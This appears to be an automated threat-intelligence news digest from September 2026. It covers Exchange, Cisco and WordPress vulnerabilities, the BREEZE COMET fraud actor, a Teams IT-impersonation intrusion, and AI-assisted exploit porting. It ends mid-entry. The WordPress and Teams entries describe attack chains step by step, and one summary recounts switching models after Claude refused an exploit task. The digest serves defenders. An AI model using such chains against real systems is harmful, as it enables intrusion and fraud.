```
Sinisa Markovic , Managing Editor, Help Net Security September 2, 2026 Share Nearly 22,000 Microsoft Exchange servers remain exposed to critical security flaw (CVE-2026-62911) Nearly 22,000 Microsoft Exchange servers remain unpatched against CVE-2026-62911, a critical authentication bypass vulnerability, according to daily scans from the Shadowserver Foundation. The United States and Germany top the list with 6,200 and 5,100 unpatched servers. CVE-2026-62911 is a critical severity vulnerability, and Microsoft describes it as “authentication bypass by capture-replay in Microsoft Exchange Server,” which allows an authorized attacker to elevate privileges over a network. Microsoft released the fix on August 11, 2026, and credits Orange Tsai of the DEVCORE Research Team, working with Trend Micro’s Zero Day Initiative, for the discovery. Although Microsoft has not yet confirmed this in its advisory, the National Cyber Security Centre of the Netherlands (NCSC-NL) flagged last week that a working exploit for the vulnerability is now circulating online. “Multiple serious vulnerabilities have been found in Microsoft Exchange Server. One of these vulnerabilities is CVE-2026-62911, with a CVSS score of 8.0,” NCSC-NL warned. “Microsoft has made updates available to address the vulnerabilities. Install these updates as soon as possible,” NCSC-NL noted. “Exchange Server 2016 and 2019 only receive security updates via the Extended Security Updates Program (ESU). Are you using one of these versions? If so, ensure that the server is accessible only internally and replace it if possible.” “Don’t know which version of Exchange Server your organization uses? Then contact your IT administrator or IT service provider,” NCSC-NL aded . Germany’s Federal Office for Information Security (BSI) wrote on its Mastodon account on August 28, 2026, that around 85 percent of on-premises Exchange servers in the country remain vulnerable to CVE-2026-62911. In June 2026, Microsoft fixed CVE-2026-42897, an actively exploited Microsoft Exchange Server vulnerability . “Exchange Server 2016 and 2019 are out of support. Only customers who enrolled in the Period 2 Extended Security Update (ESU) program are eligible to receive Exchange Server 2016 and 2019 security updates released between May and October 2026,” Microsoft said on its blog. More about exploit Microsoft Microsoft Exchange NCSC-NL vulnerability Share
```

#### Corroborating sources (1)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Nearly 22,000 Microsoft Exchange servers remain exposed to critical security flaw (CVE-2026-62911)
  - Published: 2026-09-02T13:24:09+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/02/microsoft-exchange-cve-2026-62911-critical-authentication-bypass-flaw/
  - Summary: Nearly 22,000 Microsoft Exchange servers remain unpatched against CVE-2026-62911, a critical authentication bypass vulnerability, according to daily scans from the Shadowserver Foundation. The United States and Germany top the list with 6,200 and 5,100 unpatched servers. CVE-2026-62911 is a critical severity vulnerability, and Microsoft describes it as “authentication bypass by capture-replay in Microsoft Exchange Server,” which allows an authorized attacker to elevate privileges over a network. Microsoft released the fix on August 11, 2026, and … More → The post Nearly 22,000 Microsoft Exchange servers remain exposed to critical security flaw (CVE-2026-62911) appeared first on Help Net Security .

### Cluster 3f9d82bc63 — score 21

- Title: Researchers Use Claude to Port Pre-Auth RCE Exploit From One PLC Model to Another
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-02T07:47:13+00:00
- Link: https://thehackernews.com/2026/09/researchers-use-claude-to-port-pre-auth.html
- Fetch status: ok
- Member count: 6
- Corroborating source count: 5
- Strong signals: Anthropic/Claude, CVE-2021-31886

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, credential_theft
- affected_industries: manufacturing_industrial
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2021-31886
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_industries: manufacturing_industrial
- affected_products: Anthropic/Claude
- cve_ids: CVE-2021-31886
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Forescout Research - Vedere Labs said it used Anthropic's Claude to port a working pre-authentication remote code execution (RCE) exploit from one WAGO programmable logic controller (PLC) to another, executing attacker-supplied ARM shellcode on live hardware. The exploit targets CVE-2021-31886, a stack-based buffer overflow in the Nucleus FTP server's handling of the USER command
```

#### Corroborating sources (5)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Researchers Use Claude to Port Pre-Auth RCE Exploit From One PLC Model to Another
  - Published: 2026-09-02T07:47:13+00:00
  - Link: https://thehackernews.com/2026/09/researchers-use-claude-to-port-pre-auth.html
  - Summary: Forescout Research - Vedere Labs said it used Anthropic's Claude to port a working pre-authentication remote code execution (RCE) exploit from one WAGO programmable logic controller (PLC) to another, executing attacker-supplied ARM shellcode on live hardware. The exploit targets CVE-2021-31886, a stack-based buffer overflow in the Nucleus FTP server's handling of the USER command
- **Simon Willison** (ai_security_agentic_risk)
  - Title: Just a rumour of a bug is enough to find a security exploit these days
  - Published: 2026-08-28T22:12:02+00:00
  - Link: https://simonwillison.net/2026/Aug/28/just-a-rumour-of-a-bug/
  - Summary: Just a rumour of a bug is enough to find a security exploit these days Anil Madhavapeddy is a professor of computer science at Cambridge and a core maintainer of the OCaml compiler. In this somewhat alarming post he reports that security issues in OCaml projects are seeing evidence of attempted exploits within minutes of patches being shared for discussion: This normally takes a few days and a release within a week or two is reasonable. Within about ten minutes (!) this website was fielding probes for percent-encoded traversal sequences, indicating that automated watchers are keeping an eye on public repositories. Modern coding agents have become so effective at finding flaws that the slightest hint at a new bug can be enough information for them to find it, something Anil has been able to demonstrate using his own agents, switching to DeepSeek V4 Pro⁠ when Claude Fable refused the task. Anil points out that this rate of discovery appears incompatible with existing open source embargo
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Anthropic Users Hit by Infostealer Attacks, Session Thefts
  - Published: 2026-08-31T21:08:46+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/anthropic-users-infostealer-attacks-session-thefts
  - Summary: A threat actor used a variety of infostealers to collect session information and access Claude accounts belonging to an unknown number of users.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Window to Tackle Surge in AI-Enabled Cyber Attacks Narrowing, Tech Giants Warn
  - Published: 2026-08-28T09:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/window-ai-attacks-narrowing-tech/
  - Summary: More than 100 companies, including OpenAI, Anthropic, Google and Microsoft, have urged collective action to unlock the power of AI to protect critical public services
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: From Patch to Exploit; Using Claude Code to reverse engineer an n-day in Papercut NG
  - Published: 2026-09-01T14:39:16+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1w4dvux/from_patch_to_exploit_using_claude_code_to/
  - Summary: submitted by /u/kev-thehermit [link] [comments]

### Cluster 25cdc2e4b7 — score 20

- Title: Financially Motivated Threat Actor BREEZE COMET Targets Brazil
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-09-01T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/financially-motivated-threat-actor-breeze-comet-targets-brazil/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: UNC5669

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, web_shell_backdoor
- actor_attribution: UNC5669
- affected_industries: financial_services, government, retail_ecommerce
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, web_shell_backdoor
- actor_attribution: UNC5669
- affected_industries: financial_services, government, retail_ecommerce
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Introduction Beginning in 2024 Mandiant investigated a string of compromises affecting Brazilian financial services, retail, and eCommerce organizations. Google Threat Intelligence Group (GTIG) tracks this activity as BREEZE COMET (formerly UNC5669), a financially motivated threat actor specializing in manipulating payment systems and banking software in Brazil to conduct fraudulent transfers. This activity overlaps with operations publicly reported as Plump Spider and SHADOW-AETHER-064 . In this blog, we detail BREEZE COMET’s tactics and toolkit, and provide mitigation recommendations and detections to support organizations in defending against this active and developing threat. BREEZE COMET tactics have evolved over time to leverage a customized malware suite and compromised, trusted websites to facilitate initial access, command and control (C2), and to interact with financial software and payment APIs. BREEZE COMET’s operational infrastructure may also indicate intent to expand the
```

#### Full body

```
Threat Intelligence Financially Motivated Threat Actor BREEZE COMET Targets Brazil September 1, 2026 Google Threat Intelligence Group Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Introduction Beginning in 2024 Mandiant investigated a string of compromises affecting Brazilian financial services, retail, and eCommerce organizations. Google Threat Intelligence Group (GTIG) tracks this activity as BREEZE COMET (formerly UNC5669), a financially motivated threat actor specializing in manipulating payment systems and banking software in Brazil to conduct fraudulent transfers. This activity overlaps with operations publicly reported as Plump Spider and SHADOW-AETHER-064 . In this blog, we detail BREEZE COMET’s tactics and toolkit, and provide mitigation recommendations and detections to support organizations in defending against this active and developing threat. BREEZE COMET tactics have evolved over time to leverage a customized malware suite and compromised, trusted websites to facilitate initial access, command and control (C2), and to interact with financial software and payment APIs. BREEZE COMET’s operational infrastructure may also indicate intent to expand their infrastructure footprint to other countries in Latin America and Africa. Additionally, we have evidence that BREEZE COMET is using generative artificial intelligence (AI) to support malware development, which may further increase the scale, speed, and sophistication of their operations in the future. BREEZE COMET Targets Brazilian Financial Technology BREEZE COMET operations target organizations with permission to conduct transactions through banking software, APIs, and payment systems such as Pix, STR, and Boleto. This typically includes banks, payment processors, retailers, exchanges, as well as fintech and banking software providers. To achieve their objective of conducting fraudulent transfers, BREEZE COMET must maintain: Access to the National Financial System Network (Rede Nacional do Setor Financeiro, RSFN) through an entity with this access. Access to mTLS credentials that allow sending authenticated payloads with transactional orders to Pix, STR (Brazilian Reserves Transfer System), or any transactional listener to be executed with minimal restrictions in the name of an organization with available funds. Persistent access to multiple accounts in targeted organizations’ Active Directory and/or cloud environments. Understanding of an organization’s transfer processing procedures, network controls, fintech integrations and anti-fraud systems. In order to support these requirements, BREEZE COMET evolved to operate in multiple compromised environments at the same time, crafting custom C2 malware to automate activities such as reconnaissance, lateral movement, persistence, and exfiltration. Initial Compromise and Establish Foothold BREEZE COMET has used various methods for initial access. In early compromises, Mandiant observed this threat actor use password spraying as well as voice calls impersonating IT support teams to convince users to install Remote Monitoring and Management (RMM) tools such as AnyDesk. Axur corroborates use of voice phishing, and suggests that the group has also attempted to recruit insiders at targeted organizations. In mid-2025, GTIG observed BREEZE COMET using compromised Brazilian small government websites to stage RMM tools, infostealers disguised as legitimate tax or receipt documents (e.g., ComprovantePDF.exe ) , or backdoors such as XWORM set to persist via automated startup shortcut modifications. XWORM is a backdoor that is widely available for purchase on cyber crime forums, with leaked or “cracked” versions also available. BREEZE COMET then used these compromised government websites to facilitate social engineering operations for initial access, and as C2 endpoints. The use of compromised, trusted infrastructure allowed the threat actors to avoid detection by network domain rep
```

#### Corroborating sources (3)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Financially Motivated Threat Actor BREEZE COMET Targets Brazil
  - Published: 2026-09-01T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/financially-motivated-threat-actor-breeze-comet-targets-brazil/
  - Summary: Introduction Beginning in 2024 Mandiant investigated a string of compromises affecting Brazilian financial services, retail, and eCommerce organizations. Google Threat Intelligence Group (GTIG) tracks this activity as BREEZE COMET (formerly UNC5669), a financially motivated threat actor specializing in manipulating payment systems and banking software in Brazil to conduct fraudulent transfers. This activity overlaps with operations publicly reported as Plump Spider and SHADOW-AETHER-064 . In this blog, we detail BREEZE COMET’s tactics and toolkit, and provide mitigation recommendations and detections to support organizations in defending against this active and developing threat. BREEZE COMET tactics have evolved over time to leverage a customized malware suite and compromised, trusted websites to facilitate initial access, command and control (C2), and to interact with financial software and payment APIs. BREEZE COMET’s operational infrastructure may also indicate intent to expand the
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Financially Motivated Threat Actor BREEZE COMET Targets Brazil
  - Published: 2026-09-01T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/financially-motivated-threat-actor-breeze-comet-targets-brazil/
  - Summary: Introduction Beginning in 2024 Mandiant investigated a string of compromises affecting Brazilian financial services, retail, and eCommerce organizations. Google Threat Intelligence Group (GTIG) tracks this activity as BREEZE COMET (formerly UNC5669), a financially motivated threat actor specializing in manipulating payment systems and banking software in Brazil to conduct fraudulent transfers. This activity overlaps with operations publicly reported as Plump Spider and SHADOW-AETHER-064 . In this blog, we detail BREEZE COMET’s tactics and toolkit, and provide mitigation recommendations and detections to support organizations in defending against this active and developing threat. BREEZE COMET tactics have evolved over time to leverage a customized malware suite and compromised, trusted websites to facilitate initial access, command and control (C2), and to interact with financial software and payment APIs. BREEZE COMET’s operational infrastructure may also indicate intent to expand the
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Breeze Comet Executes Hundreds of Fraudulent Transactions via Brazilian Payment Systems
  - Published: 2026-09-01T17:19:24+00:00
  - Link: https://thehackernews.com/2026/09/breeze-comet-executes-hundreds-of.html
  - Summary: Brazilian financial services, retail, and e-commerce organizations have become the target of a financially motivated threat actor dubbed Breeze Comet (formerly UNC5669) since 2024. Google Threat Intelligence Group (GTIG) and Mandiant teams described the threat actor as "specializing in manipulating payment systems and banking software in Brazil to conduct fraudulent transfers." The adversary

### Cluster 9da7ae98ee — score 19

- Title: Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-03T10:30:00+00:00
- Link: https://www.securityweek.com/cisco-warns-of-unpatched-secure-email-flaws-patches-critical-switch-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, ddos, ransomware_extortion
- affected_industries: critical_infrastructure
- affected_products: SonicWall, WordPress
- cve_ids: CVE-2026-20212, CVE-2026-20274, CVE-2026-20279, CVE-2026-20354, CVE-2026-20355
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach, ddos, active_exploitation
- affected_industries: critical_infrastructure
- affected_products: SonicWall, WordPress
- cve_ids: CVE-2026-20354, CVE-2026-20355, CVE-2026-20274, CVE-2026-20279, CVE-2026-20212
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Publicly disclosed S/MIME flaws could expose encrypted email content, while critical IOS XR and Nexus bugs could enable remote code execution and authentication bypass. The post Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities appeared first on SecurityWeek .
```

#### Full body

```
Cisco on Wednesday warned that two unpatched vulnerabilities in its enterprise email security product Secure Email have been publicly disclosed. The two flaws, tracked as CVE-2026-20354 and CVE-2026-20355 , are medium-severity issues affecting the Secure/Multipurpose Internet Mail Extensions (S/MIME) decryption functionality of the threat protection solution. According to Cisco, insufficient validation of message integrity can allow an attacker to intercept and modify traffic between email gateways using a man-in-the-middle (MitM) technique. “A successful exploit could allow the attacker to obtain plaintext content from the encrypted communication,” Cisco says in its advisory , adding that all Secure Email devices running AsyncOS version 16.5.0 or earlier with S/MIME enabled are affected. Cisco warns that the security bugs have been publicly disclosed, but notes that it is not aware of any of them being exploited in the wild. On Wednesday, the tech giant also announced patches for multiple critical-severity security defects in IOS XR and Nexus 9000 series switches that could lead to remote code execution (RCE), authentication bypass, code injection, and other types of attacks. Advertisement. Scroll to continue reading. The fixes for IOS XR resolve multiple bugs grouped based on their underlying vulnerability classes under seven CVEs, including two with a CVSS score of 9.8: CVE-2026-20274 and CVE-2026-20279. These include memory corruption and memory safety bugs and improper access control issues, respectively. The Nexus 9000 series switches received fixes for CVE-2026-20212 (CVSS score of 9.8), a security weakness that allows remote attackers to connect to by-default accessible TCP ports and execute code with root privileges. Additionally, Cisco addressed a high-severity vulnerability in Desk Phone 9800, IP Phone 7800 and 8800, and Video Phone 8875 series devices running the Session Initiation Protocol (SIP). Tracked as CVE-2026-20281, the bug allows remote, unauthenticated attackers to send continuous streams of crafted HTTP packets to the vulnerable devices and cause a denial-of-service (DoS) condition. Cisco says it is not aware of any of the patched vulnerabilities being exploited in the wild. Additional information can be found on the company’s notification of advisory publication. Related: Exploit Published for Fresh Cleo Harmony Vulnerability Related: Chrome and Firefox Updates Patch Dozens of Vulnerabilities Related: SonicWall Warns of Two SMA1000 Zero-Days Exploited in Attacks Related: Hackers Start Exploiting Critical Langflow Vulnerability Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Malicious Virtualizor Update Served via BGP Hijacking Chrome and Firefox Updates Patch Dozens of Vulnerabilities 23-Year-Old Sality P2P Botnet Disrupted Hackers Start Exploiting Critical Langflow Vulnerability Five Venezuelans Plead Guilty in US Court to ATM Jackpotting Ransomware Gang Claims Nutex Health Data Breach 9.5 Million Impacted by Aesto Health Data Breach WatchGuard Patches Critical Vulnerabilities Latest News HiddenLayer Raises $100 Million for AI Runtime Security AI Agent Firewall Startup AIR Security Emerges From Stealth With $50 Million 153 Million Driver License Images Offered on Dark Web Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability OpenLeash Adds a Human Check to Risky AI Agent Actions UK Moves to Block High-Risk Tech Suppliers From Critical Infrastructure Rockwell Automation Patches Over a Dozen Vulnerabilities Across Products Exploit Published for Fresh Cleo Harmony Vulnerability Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Virtual Event
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities
  - Published: 2026-09-03T10:30:00+00:00
  - Link: https://www.securityweek.com/cisco-warns-of-unpatched-secure-email-flaws-patches-critical-switch-vulnerabilities/
  - Summary: Publicly disclosed S/MIME flaws could expose encrypted email content, while critical IOS XR and Nexus bugs could enable remote code execution and authentication bypass. The post Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities appeared first on SecurityWeek .

### Cluster c58d4818a7 — score 17

- Title: Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-03T10:40:00+00:00
- Link: https://www.securityweek.com/over-3-million-wordpress-sites-affected-by-migration-plugin-vulnerability/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: CVE-2026-19949, WordPress

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- affected_industries: critical_infrastructure
- affected_products: WordPress
- cve_ids: CVE-2026-19949, CVE-2026-76581
- urgency_signals: no_patch_yet, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- affected_industries: critical_infrastructure
- affected_products: WordPress
- cve_ids: CVE-2026-19949
- urgency_signals: preauth_unauth, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The high-severity SQL injection flaw (CVE-2026-19949) could allow unauthenticated attackers to achieve remote code execution. The post Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability appeared first on SecurityWeek .
```

#### Full body

```
A high-severity vulnerability in the All-in-One WP Migration and Backup WordPress plugin exposes over 3 million websites to remote code execution (RCE) attacks, WordPress security firm Defiant warns. Tracked as CVE-2026-19949 (CVSS score of 8.8), the security defect is described as a second-order SQL injection issue in the archive restore functionality of the plugin. The flaw exists because user-supplied input is insufficiently escaped and existing SQL queries are not sufficiently prepared, Defiant explains . An attacker could supply malicious content via WordPress core’s trackback functionality to extract the secret key used during an archive restore operation, and then use the key to deploy a malicious plugin for RCE. All-in-One WP Migration and Backup packages sites into .wpress archives and allows admins to restore the archive on any destination server. The import operation is unauthenticated, but protected using a secret key that is saved during each database-restore pass. CVE-2026-19949 allows an attacker to submit two trackbacks to a public post, each carrying a trailing backslash and a URL leading to a payload. The input is saved without backslashes being stripped or the URLs being rejected. Advertisement. Scroll to continue reading. Once an administrator archives and then imports the site, the plugin rewrites URLs and table prefixes in the stored SQL; the attacker-supplied input is promoted to executable SQL, which results in the secret key value being written to a comment that is approved and becomes publicly visible. An unauthenticated attacker could then retrieve the secret key from the site’s comments REST API endpoint and use it to import a crafted .wpress archive containing a malicious must-use plugin that is executed upon the next page load, leading to RCE. “As with all remote code execution vulnerabilities, this can lead to complete site compromise through the use of webshells and other techniques,” Defiant notes. The vulnerability impacts all All-in-One WP Migration and Backup versions up to 7.109 and was patched in version 7.110, which was released on August 20. A highly popular backup and restore WordPress tool, the plugin has over 5 million active deployments. As of September 3, only 35% of all installations have been updated to version 7.110, meaning that roughly 3.2 million sites are running a vulnerable plugin iteration, WordPress data shows . Related: WordPress Websites Targeted via MiniOrange Plugin Vulnerabilities Related: Silent Patches Don’t Stop Attackers – They Blind Defenders Related: In Other News: Log4j RCE Scare, Minimus Shutdown, Iranian Hacker Sanctions Related: ServiceNow Patches 3 Critical Code Injection Vulnerabilitie Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Malicious Virtualizor Update Served via BGP Hijacking Chrome and Firefox Updates Patch Dozens of Vulnerabilities 23-Year-Old Sality P2P Botnet Disrupted Hackers Start Exploiting Critical Langflow Vulnerability Five Venezuelans Plead Guilty in US Court to ATM Jackpotting Ransomware Gang Claims Nutex Health Data Breach 9.5 Million Impacted by Aesto Health Data Breach WatchGuard Patches Critical Vulnerabilities Latest News HiddenLayer Raises $100 Million for AI Runtime Security AI Agent Firewall Startup AIR Security Emerges From Stealth With $50 Million 153 Million Driver License Images Offered on Dark Web Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities OpenLeash Adds a Human Check to Risky AI Agent Actions UK Moves to Block High-Risk Tech Suppliers From Critical Infrastructure Rockwell Automation Patches Over a Dozen Vulnerabilities Across Products Exploit Published for Fresh Cleo Harmony Vulnerability Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay in
```

#### Corroborating sources (3)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability
  - Published: 2026-09-03T10:40:00+00:00
  - Link: https://www.securityweek.com/over-3-million-wordpress-sites-affected-by-migration-plugin-vulnerability/
  - Summary: The high-severity SQL injection flaw (CVE-2026-19949) could allow unauthenticated attackers to achieve remote code execution. The post Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Five Critical WordPress Plugin and Theme Flaws Enable Site Takeover or RCE
  - Published: 2026-08-29T16:25:03+00:00
  - Link: https://thehackernews.com/2026/08/five-critical-wordpress-plugin-and.html
  - Summary: Multiple critical security flaws have been disclosed in WordPress plugins and themes, including WPMU DEV Dashboard, Avada, TranslatePress, Pods, and GiveWP, that could lead to authentication bypass, account takeover, and arbitrary code execution. The vulnerabilities, according to Wordfence and Patchstack, are listed below - CVE-2026-76581 (CVSS score: 9.8) - An authentication bypass flaw in
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: WordPress backup plugin flaw exposes millions of sites to takeover attacks
  - Published: 2026-09-02T19:28:46+00:00
  - Link: https://www.bleepingcomputer.com/news/security/wordpress-backup-plugin-flaw-exposes-millions-of-sites-to-takeover-attacks/
  - Summary: An SQL injection vulnerability in the All-in-One WP Migration and Backup plugin for WordPress could allow unauthenticated attackers to execute remote code and take control of affected websites. [...]

### Cluster 1946cdc3c5 — score 17

- Title: Impersonating IT support: how threat actors turn a remote session into enterprise-wide access
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-02T22:51:18+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/02/impersonating-it-support-threat-actors-turn-remote-session-into-enterprise-wide-access/
- Fetch status: ok
- Member count: 5
- Corroborating source count: 3
- Strong signals: Microsoft Defender

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion
- affected_products: Microsoft Defender
- attack_techniques: T1566.003
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft
- affected_products: Microsoft Defender
- attack_techniques: T1566.003
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft Threat Intelligence observed a human-operated intrusion campaign that abuses Microsoft Teams external collaboration to impersonate IT support, gain remote access, and deploy a Node.js-based implant. Learn how attackers move from social engineering to lateral movement using legitimate tools, and how Microsoft Defender helps detect and disrupt the activity. The post Impersonating IT support: how threat actors turn a remote session into enterprise-wide access appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Topics Actionable threat insights Defending against advanced tactics Threat intelligence Microsoft Threat Intelligence has observed a human-operated intrusion campaign that abuses Microsoft Teams external collaboration to impersonate IT or helpdesk personnel and socially engineer users into granting an interactive remote session. Once remote control is established via RMM tools, the threat actor uses PowerShell to download and silently install a malicious MSI package, which in turn stages a portable Node.js runtime and an obfuscated JavaScript implant that provides persistent command execution and command and control (C2). Unlike commodity phishing that ends with an infostealer, this campaign follows a full hands-on-keyboard playbook. After the implant is deployed, the threat actor performs extensive host and Active Directory reconnaissance, periodically captures screenshots of the victim’s desktop, executes follow-on payloads through trusted Windows binaries, and pivots across the enterprise over Windows Remote Management (WinRM) toward high-value assets such as domain controllers. The intrusion relies heavily on legitimate tooling, including Microsoft Teams, remote support software, Windows Installer, Node.js, and native administrative protocols, allowing the activity to blend into expected enterprise operations at nearly every stage. This intrusion pattern is especially high-impact because it hands an external operator credential-backed, interactive access to internal infrastructure. The reconnaissance and lateral movement patterns observed: domain enumeration, server discovery, and WinRM pivoting toward identity systems, are consistent with intrusion activity that can precede data theft, extortion, ransomware deployment, or other follow-on objectives, in which threat actors map the environment, escalate privileges, disable security controls, exfiltrate business-relevant data, and ultimately deploy ransomware across the organization. In this blog, we share our analysis of this attack chain, from initial Microsoft Teams contact through internal lateral movement, along with mitigation and hunting guidance to help defenders detect and disrupt this user-initiated access pathway before it escalates into broader compromise. Risk to enterprise environments By abusing enterprise collaboration workflows instead of traditional email-based phishing, the threat actor initiates contact through Microsoft Teams in a way that appears consistent with routine IT support. Microsoft Teams applies multiple security controls at the point of first external contact, including external tenant labeling, Accept/Block prompts, message previews, and phishing indicators, but this attack chain depends on convincing the user to bypass those warnings and voluntarily grant remote access through legitimate support tools. An approved external Teams interaction, followed by a remote session, can enable the threat actor to: Establish interactive, credential-backed system access through a legitimate remote support tool. Execute threat actor-controlled code (MSI loader and Node.js implant) using trusted installers and runtimes. Map the host and Active Directory environment through automated discovery Move laterally toward high-value infrastructure using WinRM. Capture on-screen activity and create opportunities for follow-on data access or other post-compromise actions. Attack chain overview The campaign follows a multi-stage attack chain that progresses from social engineering through payload delivery, execution, reconnaissance, and ultimately lateral movement: Initial access via Teams (T1566.003) : A threat actor operating from an external tenant initiates a Teams chat or call while impersonating IT/helpdesk staff and coaxes the user into handing over their device, for example, approving a “request control” prompt during a Teams screen-share, or opening Quick Assist
```

#### Corroborating sources (3)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Impersonating IT support: how threat actors turn a remote session into enterprise-wide access
  - Published: 2026-09-02T22:51:18+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/02/impersonating-it-support-threat-actors-turn-remote-session-into-enterprise-wide-access/
  - Summary: Microsoft Threat Intelligence observed a human-operated intrusion campaign that abuses Microsoft Teams external collaboration to impersonate IT support, gain remote access, and deploy a Node.js-based implant. Learn how attackers move from social engineering to lateral movement using legitimate tools, and how Microsoft Defender helps detect and disrupt the activity. The post Impersonating IT support: how threat actors turn a remote session into enterprise-wide access appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Impersonating IT support: how threat actors turn a remote session into enterprise-wide access
  - Published: 2026-09-02T22:51:18+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/02/impersonating-it-support-threat-actors-turn-remote-session-into-enterprise-wide-access/
  - Summary: Microsoft Threat Intelligence observed a human-operated intrusion campaign that abuses Microsoft Teams external collaboration to impersonate IT support, gain remote access, and deploy a Node.js-based implant. Learn how attackers move from social engineering to lateral movement using legitimate tools, and how Microsoft Defender helps detect and disrupt the activity. The post Impersonating IT support: how threat actors turn a remote session into enterprise-wide access appeared first on Microsoft Security Blog .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Fake Software Installers Disable Windows Update and Weaken Microsoft Defender
  - Published: 2026-09-02T16:41:06+00:00
  - Link: https://thehackernews.com/2026/09/fake-software-installers-disable.html
  - Summary: An active malware campaign is using bogus software-download websites to impersonate trusted vendors and distribute malicious installers. "The campaign has targeted users looking to download popular software and has resulted in compromises across multiple organizations and industries, primarily affecting China-based operations of multinational organizations and Chinese-speaking users," Microsoft

### Cluster 5f380a65c5 — score 15

- Title: GeoNetwork Fixes Unauthenticated RCE Chain Affecting Government Geoportal Backends
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-02T09:18:02+00:00
- Link: https://thehackernews.com/2026/09/geonetwork-fixes-unauthenticated-rce.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: government
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
